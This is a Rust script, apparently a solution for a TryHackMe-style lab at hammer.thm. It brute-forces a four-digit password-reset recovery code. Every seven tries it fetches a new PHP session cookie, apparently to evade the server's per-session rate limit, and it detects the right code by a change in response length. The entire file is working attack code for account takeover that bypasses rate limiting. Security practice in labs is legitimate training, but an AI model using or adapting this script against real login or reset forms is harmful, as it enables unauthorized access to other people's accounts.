use reqwest::blocking::Client;
use reqwest::header::{CONTENT_TYPE, COOKIE};
use reqwest::redirect::Policy;
use std::error::Error;
use std::time::Instant;

fn get_phpsessid(client: &Client) -> Result<String, Box<dyn Error>> {
    // Faz a requisição POST para obter o PHPSESSID
    let response = client
        .post("http://hammer.thm:1337/reset_password.php")
        .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
        .body("email=tester%40hammer.thm")
        .send()?;

    // Extrai o PHPSESSID dos cabeçalhos da resposta
    if let Some(cookie_header) = response.headers().get("set-cookie") {
        let cookie_str = cookie_header.to_str()?;

        if cookie_str.contains("PHPSESSID=") {
            let phpsessid = cookie_str
                .split(';')
                .next()
                .unwrap()
                .split('=')
                .nth(1)
                .unwrap();
            return Ok(phpsessid.to_string());
        }
    }

    Err("PHPSESSID não encontrado".into())
}

fn submit_recovery_code(
    client: &Client,
    phpsessid: &str,
    recovery_code: &str,
) -> Result<String, Box<dyn Error>> {
    // Enviar o código de recuperação com o PHPSESSID
    let response = client
        .post("http://hammer.thm:1337/reset_password.php")
        .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
        .header(COOKIE, format!("PHPSESSID={}", phpsessid))
        .body(format!("recovery_code={}&s=180", recovery_code))
        .send()?;

    // Retornar o texto da resposta
    let text = response.text()?;
    Ok(text)
}

fn main() -> Result<(), Box<dyn Error>> {
    let start = Instant::now();

    // Criar um cliente HTTP que não segue redirecionamentos
    let client = Client::builder().redirect(Policy::none()).build()?;

    // Obter o PHPSESSID inicial
    let mut phpsessid = match get_phpsessid(&client) {
        Ok(id) => {
            println!("PHPSESSID inicial: {}", id);
            id
        }
        Err(e) => {
            println!("Falha ao obter PHPSESSID inicial: {}", e);
            return Err(e);
        }
    };

    // Preparar cliente para paralelismo
    let mut total_tentativas = 0;
    let mut ultima_atualizacao = Instant::now();

    for i in 0..10000 {
        // Atualizar PHPSESSID a cada 7 tentativas
        if i % 7 == 0 && i > 0 {
            match get_phpsessid(&client) {
                Ok(id) => {
                    phpsessid = id;
                }
                Err(e) => {
                    println!("Falha ao renovar PHPSESSID na tentativa {}: {}", i, e);
                }
            }
        }

        // Formatar o código de recuperação como uma string de 4 dígitos
        let recovery_code = format!("{:04}", i);
        total_tentativas += 1;

        // Mostrar progresso a cada segundo
        let agora = Instant::now();
        if agora.duration_since(ultima_atualizacao).as_secs() >= 1 {
            println!(
                "Testando código: {} ({} tentativas, {} segundos)",
                recovery_code,
                total_tentativas,
                start.elapsed().as_secs()
            );
            ultima_atualizacao = agora;
        }

        // Enviar o código de recuperação
        match submit_recovery_code(&client, &phpsessid, &recovery_code) {
            Ok(response_text) => {
                // Contar palavras na resposta
                let word_count = response_text.split_whitespace().count();

                // Verificar se o número de palavras é diferente de 148
                if word_count != 148 {
                    println!("Sucesso! Código de recuperação: {}", recovery_code);
                    println!("PHPSESSID: {}", phpsessid);
                    println!("Tempo total: {} segundos", start.elapsed().as_secs());
                    println!("Total de tentativas: {}", total_tentativas);
                    break;
                }
            }
            Err(e) => {
                println!("Erro ao enviar código {}: {}", recovery_code, e);
                // Pequena pausa para não sobrecarregar o servidor
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
        }
    }

    Ok(())
}
